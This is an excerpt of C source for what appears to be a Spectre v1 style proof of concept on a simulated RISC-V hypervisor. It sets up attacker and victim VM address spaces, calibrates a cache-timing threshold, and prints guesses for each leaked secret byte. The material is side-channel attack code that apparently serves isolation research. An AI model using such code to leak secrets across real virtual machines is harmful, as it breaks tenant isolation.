...
static void init_page_space(struct page_space *space, uint64_t vmid)
{
  ...
  space->hgatp = space->vmid << HGATP_VMID_SHIFT;
}
...
int main(void)
{
  ...
  printf("[v1-vmid-priv] model=sv48-vmid-vu-isolation attacker=VU victim=VU service=machine-hypervisor-scheduler attacker_vmid=%lu victim_vmid=%lu normalized_attacker_vmid=%lu normalized_victim_vmid=%lu fence_on_switch=%d filter_known_noise=%d secret_sz=%d candidates=%d flush_lines=%d control_only=%d\n",
  ...
  printf("[v1-vmid-priv] secret_offset=%d\n", SECRET_OFFSET);
  printf("[v1-vmid-priv] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v1-vmid-priv] isolation attacker_direct_victim_secret=expect-fault shared_probe=mapped-both victim_data=mapped-victim-vm-only hgatp_vmid=on\n");
  printf("[v1-vmid-priv] victim_array1=%p victim_secret=%p malicious_base=%lu probe=%p\n",
  ...
  printf("[v1-vmid-priv] isolation U-direct-victim-read fault_seen=%lu completed=%lu value=0x%02lx u_text=[%p,%p) a_data=[%p,%p) shared=[%p,%p) v_data=[%p,%p)\n",
  ...
  printf("[v1-vmid-priv] vsatp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx\n",
         attacker_space.satp, victim_space.satp,
         observed_attacker_vsatp, observed_victim_vsatp);
  printf("[v1-vmid-priv] hgatp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx vmid_mask=0x%lx\n",
         attacker_space.hgatp, victim_space.hgatp,
         observed_attacker_hgatp, observed_victim_hgatp, HGATP_VMID_MASK);
  printf("[v1-vmid-priv] traps=%lu victim_calls=%lu victim_done=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
  ...
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    ...
    printf("[v1-vmid-priv] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v1-vmid-priv] byte %lu rounds=%lu early_stop=%d min_score=%d gap=%d\n",
